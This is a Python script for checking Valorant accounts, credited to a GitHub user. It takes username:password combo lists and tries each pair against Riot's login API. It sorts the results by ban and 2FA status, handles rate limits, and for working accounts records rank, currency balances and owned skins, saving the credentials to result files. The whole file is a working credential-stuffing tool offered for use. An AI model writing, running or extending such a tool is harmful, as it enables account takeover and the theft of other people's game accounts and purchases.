from colorama import Fore, init
from urllib import request
from requests import session as sesh
from requests.adapters import HTTPAdapter
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
from tkinter import *
from collections import OrderedDict
from re import compile
import pandas
import requests
import time
import os
import ctypes


init(convert=True)

checked = 0
good = 0
timeban = 0
perban = 0
notexist = 0
rate = 0
verified = 0
unverified = 0
xds = []

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block,
                                       ssl_version=PROTOCOL_TLSv1_2)
def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())
def checker():
    global good, timeban, perban, notexist, rate, checked, verified, unverified, _2FA
    print("Github.com/xharky")
    print("[1] GUI")
    print("[2] LOG")
    print("[3] FULL CAPTURE")
    print("[4] INFO")

    choice = input("[>] ")
    choice = int(choice)
    if choice == 4:
        print("DC: https://discord.gg/heJ2dzpYPZ")
        print("Option 1: is a static gui on the screen ")
        print("Otption 2 is dynamic lol idk how to describe")
        print("Option 3 is a dynamic full caputure checker")
        exit()

    file1 = open('combo.txt', 'r')
    lines = file1.readlines()
    with open("combo.txt", 'r+', encoding='utf-8') as e:
        ext = e.readlines()
        for line in ext:
            xd = line.split(":")[0].replace('\n', '')
            xds.append(xd)
    num = len(xds)
    for line in lines:
        username = line.split(":")[0].replace('\n', '')
        password = line.split(":")[1].replace('\n', '')
        ctypes.windll.kernel32.SetConsoleTitleW(f"Valorant checker | Good: {good} | Timebanned: {timeban} | Permbanned: {perban} | Not exist: {notexist} | Ratelimited: {rate} | Checked: {checked}/{num}")
        if choice == 1:
            os.system("cls")
            print("")
            print(center(f"Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET} "))
            print(center(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
            print(center(f"Checked:            [{Fore.YELLOW}{checked}/{num}{Fore.WHITE}]"))
            print(center(f"Good:               [{Fore.GREEN}{good}{Fore.WHITE}]"))
            print(center(f"Timeban:            [{Fore.RED}{timeban}{Fore.WHITE}]"))
            print(center(f"Permban:            [{Fore.RED}{perban}{Fore.WHITE}]"))
            print(center(f"Not exist:          [{Fore.RED}{notexist}{Fore.WHITE}]"))
            print(center(f"Ratelimit           [{Fore.YELLOW}{rate}{Fore.WHITE}]"))
            print(center(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
        headers = OrderedDict({
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)'
        })
        session = sesh()
        session.headers = headers
        session.mount('https://', TLSAdapter())
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
        }
        r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = {
            'type': 'auth',
            'username': username,
            'password': password
        }
        r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = r2.json()
        if "access_token" in r2.text:
            pattern = compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
            typebanned = "unbann"
            checked += 1
        elif "auth_failure" in r2.text:
            if choice == 2:
                print(f"{Fore.RED}[Not exist]{Fore.RESET} {username}:{password}")
            if choice == 3:
                print(f"{Fore.RED}[Not exist]{Fore.RESET} {username}:{password}")
            notexist += 1
            checked += 1
            continue
        elif "rate_limited" in r2.text:
            if choice == 2:
                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET} {username}:{password} waiting 20 sec")
            if choice == 3:
                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET} {username}:{password} waiting 20 sec")
            rate += 1
            time.sleep(20)
            continue
        elif 'multifactor' in r2.text:
            typebanned = "2FA"
            if choice == 2:
                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
            if choice == 3:
                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
            continue
        else:
            pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
            typebanned = "unbann"
            
        headers = {
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
            'Authorization': f'Bearer {token}',
        }
        r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
        entitlement = r.json()['entitlements_token']
        r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
        data = r.json()
        GameName =  r.text.split('game_name":"')[1].split('"')[0]           
        Tag = r.text.split('tag_line":"')[1].split('"')[0]  
        Sub = r.text.split('sub":"')[1].split('"')[0] 
        EmailVerified = r.text.split('email_verified":')[1].split('"')[0]
        data1 = data['acct']
        unix_time = data1['created_at']
        unix_time = int(unix_time)
        result_s = pandas.to_datetime(unix_time,unit='ms')
        str(result_s)
        typebanned = None
        result_s1 = None
        try:
            data = r.json()
            data2 = data['ban']
            data3 = data2['restrictions']
            for x in data3:
                typebanned = x['type']
            if typebanned == "PERMANENT_BAN":
                result_s1 = "Permantent"
                bannedtxt = open("results//ban.txt", "a+", encoding='utf-8')
                bannedtxt.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                if choice == 3:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                perban += 1
                continue
            elif typebanned == "TIME_BAN":
                for y in data3:
                    lol = y['dat']
                exeperationdate = lol['expirationMillis']
                unix_time1 = exeperationdate
                unix_time1 = int(unix_time1)
                result_s1 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s1)
                bannedtxt1 = open("results//timeban.txt", "a+", encoding='utf-8')
                bannedtxt1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt1.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                if choice == 3:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                timeban += 1
                continue

            elif typebanned == "unbann":
                if choice == 2:
                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                    bannedtxt12.close()
                    if choice == 2:
                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                    good += 1
                    continue
            else:
                if choice == 2:
                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                    if choice == 2:
                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                    good += 1
                    continue
        except:
            if choice == 2:
                if typebanned == None:
                    typebanned = "Unbanned"
                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                    bannedtxt12.close()
                    if choice == 2:
                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                    good += 1
                    continue
            continue
        if choice == 3:
    #get Region + Accountlvl
            r2 = session.get(f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}")
            if "region" in r2.text:
                Region = r2.json()["data"]["region"]
                AccountLevel = r2.json()["data"]["account_level"]
            else:
                Region = "na"
                AccountLevel = "Unknow"
            RankIDtoRank = {"0":"Unranked",
                        "1":"Unused1", 
                        "2":"Unused2" ,
                        "3":"Iron 1" ,
                        "4":"Iron 2" ,
                        "5":"Iron 3" ,
                        "6":"Bronz 1" ,
                        "7":"Bronz 2" ,
                        "8":"Bronz 3" ,
                        "9":"Silver 1" ,
                        "10":"Silver 2", 
                        "11":"Silver 3" ,
                        "12":"Gold 1" ,
                        "13":"Gold 2" ,
                        "14":"Gold 3" ,
                        "15":"Platinum 1" ,
                        "16":"Platinum 2" ,
                        "17":"Plantinum 3" ,
                        "18":"Diamond 1" ,
                        "19":"Diamond 2" ,
                        "20":"Diamond 3" ,
                        "21":"Ascendant 1" ,
                        "22":"Ascendant 2" ,
                        "23":"Ascendant 3" ,
                        "24":"Immortal 1" ,
                        "25":"Immortal 2" ,
                        "26":"Immortal 3" ,
                        "27":"Radiant"}

            PvpNetHeaders = {"Content-Type": "application/json",
                            "Authorization": f"Bearer {token}",
                            "X-Riot-Entitlements-JWT": entitlement,
                            "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
                            "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
            }
    #get Points
            try:
                GetPoints = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",headers=PvpNetHeaders)
                ValorantPoints = GetPoints.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
                Radianite = GetPoints.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
            except:
                ValorantPoints = "UnKnow"
                Radianite = "UnKnow" 
    #get last match
            try:
                r = requests.get(f"https://pd.{Region}.a.pvp.net/match-history/v1/history/{Sub}?startIndex=0&endIndex=10",headers=PvpNetHeaders)
                data = r.json()
                data2 = data["History"]
                for x in data2:
                    data3 = x['GameStartTime']
                unix_time1 = data3
                unix_time1 = int(unix_time1)
                result_s2 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s2)
                last_time = result_s2
            except:
                result_s2 = "Unkown"
                last_time = "Unkown"
    #get Rank
            try:
                CheckRanked = requests.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders)

                if '","Matches":[]}' in CheckRanked.text:
                    Rank = "UnRanked"
                    
                else:
                    RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(',"')[0]
                    Rank = RankIDtoRank[RankID] 
            except:
                Rank = "Unknow"

            headers ={
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
            }

    #get Skins
            r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
            response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt')
            response = response_API.text
            skinsList = response.splitlines()
            userSkins = []
            SkinStr = ""

            skins = r.json()["Entitlements"]
            for skin in skins:
                UidToSearch = skin['ItemID']
                for item in skinsList:
                    details = item.split("|")
                    namePart = details[0]
                    idPart = details[1]
                    name = namePart.split(":")[1]
                    id = idPart.split(":")[0].lower()
                    if id == UidToSearch:
                        userSkins.append(name)
                        SkinStr += "| " + name + "\n"

            if typebanned == None:
                typebanned = "Unbanned"
                bannedtxt12 = open("results//fullcapture.txt", "a+", encoding='utf-8')
                bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[------------------------------------]\n\n")
                bannedtxt12.close()
                if choice == 3:
                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
                good += 1
                continue
        
checker()
